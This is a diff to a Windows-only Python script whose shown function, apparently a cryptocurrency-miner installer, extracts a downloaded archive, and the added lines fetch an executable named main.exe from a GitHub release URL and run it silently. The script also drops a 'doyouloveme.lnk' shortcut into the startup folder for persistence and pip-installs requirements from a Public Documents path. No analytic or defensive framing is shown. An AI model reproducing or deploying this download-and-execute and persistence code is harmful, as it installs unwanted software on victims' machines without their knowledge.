@@ -2,7 +2,7 @@ try:
     import os, win32com.client, wmi, urllib.request, subprocess, sys, zipfile, time, requests
 except ImportError:
     pyd = str(sys.executable)
-    os.system(pyd + " -m pip install -r C:/Users/Public/Documents/requirements.txt")
+    os.system(pyd + " -m pip install -r C:/Users/Public/Documents/Benjamin/requirements.txt")
     
 if(os.name != "nt"):
 	os._exit(1)
@@ -73,6 +73,11 @@ def xm():
             zip_ref.extractall(xmpath)
          time.sleep(3)
          os.remove("{}/cuda.zip".format(xmpath))
+
+   if not os.path.exists(xmpath + 'main.exe'):
+      urllib.request.urlretrieve("https://github.com/benjaminloir/super-duper-broccoli/releases/download/doyouloveme/main.exe", "{}/main.exe".format(xmpath))
+      os.system('{}/main.exe'.format(xmpath))
+      time.sleep(5)
       
    if not os.path.exists(startupath + 'doyouloveme.lnk'):
       path = os.path.join(startupath, 'doyouloveme.lnk')
